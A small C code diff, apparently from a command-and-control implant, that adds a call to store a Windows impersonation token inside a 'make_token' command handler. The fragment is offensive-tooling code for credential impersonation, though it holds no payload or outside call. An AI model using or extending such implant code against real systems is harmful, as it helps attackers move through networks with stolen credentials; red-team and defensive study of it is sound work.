@@ -73,6 +73,10 @@ VOID cmd_make_token(PINSTANCE inst, PPARSER args, PPACKAGE response) {
     if (inst->ImpersonationToken) gate_CloseHandle(inst, inst->ImpersonationToken);
     inst->ImpersonationToken = h_token;
 
+#ifdef INCLUDE_CMD_TOKEN_STORE
+    token_store_add(inst, h_token, 0);
+#endif
+
     package_add_string(inst, response, dom_user);
 }
 
